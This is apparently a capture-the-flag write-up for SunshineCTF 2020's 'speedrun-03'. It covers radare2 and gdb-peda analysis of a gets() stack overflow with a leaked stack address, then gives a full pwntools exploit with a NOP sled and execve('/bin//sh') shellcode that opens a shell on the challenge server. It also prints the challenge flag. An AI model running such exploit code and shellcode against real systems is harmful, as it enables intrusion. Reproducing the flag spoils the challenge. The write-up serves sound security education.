# speedrun-03

## Task

nc chal.2020.sunshinectf.org 30003

File: chall_03

Tags: binary exploitation

## Solution

This time we have PIE enabled, but no NX. We therefore can write shellcode to the stack. But we need to find out where the stack is located.

```nasm
[0x00000650]> afl
0x00000650    1 42           entry0
0x00000680    4 50   -> 40   sym.deregister_tm_clones
0x000006c0    4 66   -> 57   sym.register_tm_clones
0x00000710    5 58   -> 51   sym.__do_global_dtors_aux
0x00000750    1 10           entry.init0
0x00000840    1 2            sym.__libc_csu_fini
0x0000075a    1 52           sym.vuln
0x00000610    1 6            sym.imp.printf
0x00000630    1 6            sym.imp.gets
0x00000844    1 9            sym._fini
0x000007d0    4 101          sym.__libc_csu_init
0x0000078e    1 52           main
0x00000600    1 6            sym.imp.puts
0x00000620    1 6            sym.imp.fgets
0x000005d0    3 23           sym._init
0x00000000    9 459  -> 494  loc.imp._ITM_deregisterTMCloneTable
[0x00000650]> pdf@sym.vuln
            ; CALL XREF from main @ 0x7ba
┌ 52: sym.vuln ();
│           ; var char *s @ rbp-0x70
│           0x0000075a      55             push rbp
│           0x0000075b      4889e5         mov rbp, rsp
│           0x0000075e      4883ec70       sub rsp, 0x70
│           0x00000762      488d4590       lea rax, [s]
│           0x00000766      4889c6         mov rsi, rax
│           0x00000769      488d3de40000.  lea rdi, str.I_ll_make_it:__p ; 0x854 ; "I'll make it: %p\n" ; const char *format
│           0x00000770      b800000000     mov eax, 0
│           0x00000775      e896feffff     call sym.imp.printf         ; int printf(const char *format)
│           0x0000077a      488d4590       lea rax, [s]
│           0x0000077e      4889c7         mov rdi, rax                ; char *s
│           0x00000781      b800000000     mov eax, 0
│           0x00000786      e8a5feffff     call sym.imp.gets           ; char *gets(char *s)
│           0x0000078b      90             nop
│           0x0000078c      c9             leave
└           0x0000078d      c3             ret
```

Thankfully it's leaked to us.

We now need to correct length of our padding. We use peda pattern function for that. Since there is a call to `fgets` in main we add a newline in the pattern file.

We create a pattern with `pattern create 200 pattern.txt`, insert a newline and `run < pattern.txt` after we set a breakpoint at the return instruction in `vuln`.

```nasm
gdb-peda$ info register rsp
rsp            0x7fffffffe068      0x7fffffffe068
gdb-peda$ x/s 0x7fffffffe068
0x7fffffffe068: "jAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA"
gdb-peda$ pattern offset jAA9AAOAAkA
jAA9AAOAAkA found at offset: 120
```

We now need some shellcode. You can find them on `shell-storm` or anywhere else. I used `Linux/x86-64 execveat("/bin//sh")` from `ZadYree, vaelio and DaShrooms`.

We receive the stack address, write out padding, then we overwrite the return address with `stack_addr + stack_size + 8 + padd`.

After that we use a NOP sled to slide in our shellcode.

```python
from pwn import *

#p = process("./chall_03")
p = remote("chal.2020.sunshinectf.org", 30003)

info(p.recvline())
p.sendline()
info(p.recvuntil("I'll make it: "))
addr = p.recv()
info(addr)

payload  = "A" * 120
payload += p64(int(addr, 16) + 130)
payload += b'\x90'*16
payload += b'\x6a\x42\x58\xfe\xc4\x48\x99\x52\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5e\x49\x89\xd0\x49\x89\xd2\x0f\x05'

p.sendline(payload)
p.interactive()
```

We now get our flag:

```bash
$ python2 pwny.py
[+] Opening connection to chal.2020.sunshinectf.org on port 30003: Done
[*] Just in time.
[*] I'll make it:
[*] 0x7fffc9648a70
[*] Switching to interactive mode
$ ls
chall_03
flag.txt
$ cat flag.txt
sun{a-little-piece-of-heaven-26c8795afe7b3c49}
```
